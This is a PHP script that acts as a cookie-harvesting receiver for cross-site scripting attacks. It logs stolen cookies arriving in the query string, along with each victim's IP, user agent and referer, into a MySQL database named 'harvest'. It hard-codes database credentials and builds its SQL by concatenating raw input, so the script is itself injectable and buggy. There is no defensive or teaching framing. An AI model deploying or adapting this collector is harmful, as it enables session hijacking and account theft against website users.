<?php 

function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "unknown"; 
	return($ip); 
} 

function logData() 
{ 
	$data["cookie"] = $_SERVER['QUERY_STRING']; 
	$register_globals = (bool) ini_get('register_gobals'); 
	if ($register_globals) $data["ip"] = getenv('REMOTE_ADDR'); 
	else $data["ip"] = GetIP(); 

	$data["rem_port"] = $_SERVER['REMOTE_PORT']; 
	$data["user_agent"] = $_SERVER['HTTP_USER_AGENT']; 
	$data["rqst_method"] = $_SERVER['METHOD']; 
	$data["rem_host"] = $_SERVER['REMOTE_HOST']; 
	$data["referer"] = $_SERVER['HTTP_REFERER'];
	$data["date"]=date ("l dS of F Y h:i:s A"); 

	return $data;

} 

$data = logData();
	
$servername = "localhost";
$username = "revelation";
$password = "r3v3l@t104";
$dbname = "harvest";
$sql = 'INSERT INTO cookies (cookie, ip, rem_port, user_agent, rqst_method, rem_host, referer, date)
    VALUES ('.$data["cookie"].', '.$data["ip"].', '.$data["rem_port"].', '.$data["user_agent"].', '.$data["rqst_method"].','.$data["rem_host"].', '.$data["referer"].', '.$data["date"].')';
    
try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    // set the PDO error mode to exception
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    // use exec() because no results are returned
    $conn->exec($sql);
    echo "New record created successfully";
    }
catch(PDOException $e)
    {
    echo $sql . "<br>" . $e->getMessage();
    }

$conn = null;
	

?>
